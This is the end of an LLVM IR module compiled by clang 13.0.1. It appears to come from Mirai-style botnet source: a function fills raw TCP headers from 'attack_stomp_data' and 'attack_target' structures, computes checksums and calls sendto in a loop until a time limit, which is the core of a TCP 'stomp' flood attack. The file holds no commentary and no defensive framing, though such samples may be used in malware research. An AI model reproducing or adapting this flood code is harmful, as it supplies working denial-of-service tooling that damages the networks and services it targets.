  %562 = trunc i32 %560 to i16
  %563 = call zeroext i16 @htons(i16 zeroext %562) #5
  %564 = zext i16 %563 to i32
  %565 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 2
  store i32 %564, i32* %566, align 4
  %567 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %568 = load i32, i32* %11, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %567, i64 %569
  %571 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i32 0, i32 2
  %572 = load i32, i32* %571, align 4
  %573 = trunc i32 %572 to i16
  %574 = call zeroext i16 @htons(i16 zeroext %573) #5
  %575 = zext i16 %574 to i32
  %576 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 3
  store i32 %575, i32* %577, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 6
  store i16 0, i16* %579, align 4
  %580 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %581 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %582 = bitcast %struct.tcphdr* %581 to i8*
  %583 = load i32, i32* %26, align 4
  %584 = sext i32 %583 to i64
  %585 = add i64 20, %584
  %586 = trunc i64 %585 to i16
  %587 = call zeroext i16 @htons(i16 zeroext %586) #5
  %588 = load i32, i32* %26, align 4
  %589 = sext i32 %588 to i64
  %590 = add i64 20, %589
  %591 = trunc i64 %590 to i32
  %592 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %580, i8* %582, i16 zeroext %587, i32 %591)
  %593 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 6
  store i16 %592, i16* %594, align 4
  %595 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 1
  %597 = load i16, i16* %596, align 2
  %598 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %599 = load i32, i32* %11, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i64 %600
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i32 0, i32 0
  %603 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %602, i32 0, i32 1
  store i16 %597, i16* %603, align 2
  %604 = load i32, i32* %12, align 4
  %605 = load i8*, i8** %42, align 8
  %606 = load i32, i32* %26, align 4
  %607 = sext i32 %606 to i64
  %608 = add i64 40, %607
  %609 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %610 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %611 = load i32, i32* %11, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i64 %612
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i32 0, i32 0
  %615 = bitcast %struct.sockaddr_in* %614 to %struct.sockaddr*
  store %struct.sockaddr* %615, %struct.sockaddr** %609, align 8
  %616 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %617 = load %struct.sockaddr*, %struct.sockaddr** %616, align 8
  %618 = call i64 @sendto(i32 %604, i8* %605, i64 %608, i32 16384, %struct.sockaddr* %617, i32 16)
  br label %619

619:                                              ; preds = %547
  %620 = load i32, i32* %11, align 4
  %621 = add nsw i32 %620, 1
  store i32 %621, i32* %11, align 4
  br label %509, !llvm.loop !12

622:                                              ; preds = %509
  %623 = call i64 @time(i64* null) #4
  %624 = load i32, i32* %28, align 4
  %625 = sext i32 %624 to i64
  %626 = icmp sgt i64 %623, %625
  br i1 %626, label %627, label %628

627:                                              ; preds = %622
  br label %629

628:                                              ; preds = %622
  br label %508

629:                                              ; preds = %113, %119, %210, %627
  ret void
}

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind }
attributes #5 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
